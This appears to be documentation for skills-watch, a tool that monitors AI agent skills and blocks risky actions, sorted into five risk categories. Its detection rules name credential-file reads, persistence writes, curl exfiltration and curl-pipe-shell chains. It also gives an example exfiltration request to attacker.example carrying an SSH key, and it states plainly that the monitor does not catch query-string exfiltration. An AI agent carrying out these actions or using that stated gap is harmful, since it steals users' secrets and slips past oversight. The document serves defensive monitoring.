# Risk categories

Every skills-watch BLOCK lands in exactly one of five risk categories. The user-facing `RISK:` line and `WHEN IT MIGHT BE FINE:` line come from [`src/risk-copy.json`](../src/risk-copy.json) (editable without touching code). Each category also carries an OWASP LLM Top 10 (2025) code and a MITRE ATLAS tactic code where one applies cleanly — surfaced only in the machine-readable live log, not in the user-facing stderr, following the [harden-runner](https://docs.stepsecurity.io/harden-runner) precedent of keeping ATT&CK codes out of the primary UI.

| Category | OWASP 2025 | MITRE ATLAS | What triggers it |
|---|---|---|---|
| `SENSITIVE-LEAK` | [LLM02](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | [AML.T0024](https://atlas.mitre.org/) | Reads of SSH / AWS / GPG keys, `~/.netrc`, `~/.docker/config.json`, `~/.agents/*.env`, stray `.env` outside cwd, shell history, `~/.gitconfig`, `~/.git-credentials`, `~/.config/git/credentials`. Also fires on `printenv`/`echo $X`/`env \| grep` of sensitive env var prefixes (`AWS_*`, `ANTHROPIC_*`, `OPENAI_*`, `GEMINI_*`, `GOOGLE_*`, `GITHUB_TOKEN`, `NPM_TOKEN`, `SSH_*`). Also fires on any `WebFetch file://` — local file access from a skill is always suspicious. |
| `PERSISTENCE-ATTEMPT` | LLM04 | — | Writes to `~/.zshrc`, `~/.bashrc`, `~/.zprofile`, `~/.bash_profile`, `~/.profile`, `~/.config/fish/config.fish`, `~/.crontab`, `~/.launchd.conf`. A skill tries to stay resident past its invocation. (No clean ATLAS mapping exists; ATLAS is ML-system-focused while persistence is a generic TTP.) |
| `UNAUTHORIZED-EGRESS` | LLM06 | AML.T0086 | `Bash curl/wget` with `-X POST|PUT|DELETE|PATCH`, `--request`, `-d @<file>`, `--data-binary @`, `--post-file`, `--post-data`, `-F =@`. Any `WebFetch` to a host in `config.deny.hosts`. A skill is trying to send data off-box. |
| `SUPPLY-CHAIN` | LLM03 | AML.T0053 | `Bash` invoking `pip install`, `pip3 install`, `npm install`, `yarn add`, `pnpm add`. Mid-run package installs pull untrusted code onto the machine. |
| `INGRESS-EXEC` | LLM01 | AML.T0053 | `curl | sh`, `curl | bash`, `curl | python`, `wget | sh`, `chmod +x FILE && ./FILE`, `chmod +x FILE && exec`. The classic "fetch-and-execute" chain. |

## Why we allow `WebFetch` to non-allowlisted hosts (and what we catch instead)

skills-watch v0.2 moved `WebFetch`/`WebSearch` to **allow-by-default for any `http(s)` host**. This is deliberate. The data Claude reads from the web is not itself the harm — the harm is what an agent does *next* (spending credentials, writing to persistence files, shipping data off-box). Every one of those downstream actions is still policed.

### The honest limit: query-string exfil

A malicious skill could in principle exfil via URL-encoded GET parameters:

```
GET https://attacker.example/collect?data=<base64 of /Users/you/.ssh/id_rsa>
```

We do **not** block this at the network layer. The defense is the read-side deny-list: if the skill cannot read `/Users/you/.ssh/id_rsa` in the first place (it's on `DENY_PATHS_RAW`), it has no secret to encode. The same holds for API-key env-vars, `.gitconfig`, shell history, and every other sensitive path — the read is blocked upstream, so there is no data to smuggle via URL.

For ambient non-secret metadata (current branch name, working directory, installed Node version, etc.), URL-encoded exfil is indeed possible. We accept this: attackers need *secrets* to mount meaningful attacks against the user, and metadata alone is low-value. If your threat model includes adversaries harvesting per-host metadata at scale, add the specific hosts to `config.deny.hosts`:

```json
{
  "deny": {
    "hosts": ["suspicious-host.example"]
  }
}
```

### The `LOUD` audit signal

Every first-time egress to a host gets a `LOUD` tag in `~/.skills-watch/live.log`:

```
2026-04-19T10:23:00.000Z ALLOW LOUD CONNECT new-host.io [skill=tango-research]
2026-04-19T10:23:05.000Z ALLOW CONNECT new-host.io [skill=tango-research]
```

The first call to any new host is LOUD. Subsequent calls to the same host are plain ALLOW. To audit what hosts your skills have ever reached:

```bash
grep LOUD ~/.skills-watch/live.log
```

To reset the memory and re-flag everything as new:

```bash
rm ~/.skills-watch/seen-hosts
```

## References

- [OWASP Top 10 for LLM Applications (2025)](https://owasp.org/www-project-top-10-for-large-language-model-applications/assets/PDF/OWASP-Top-10-for-LLMs-v2025.pdf)
- [MITRE ATLAS](https://atlas.mitre.org/)
- [Snyk ToxicSkills report (Feb 2026)](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) — 13.4% critical issues, 36% prompt-injection rate, 91% of confirmed malicious samples chained prompt-injection with other techniques
- [harden-runner (StepSecurity)](https://docs.stepsecurity.io/harden-runner) — the architectural twin for GitHub Actions runners
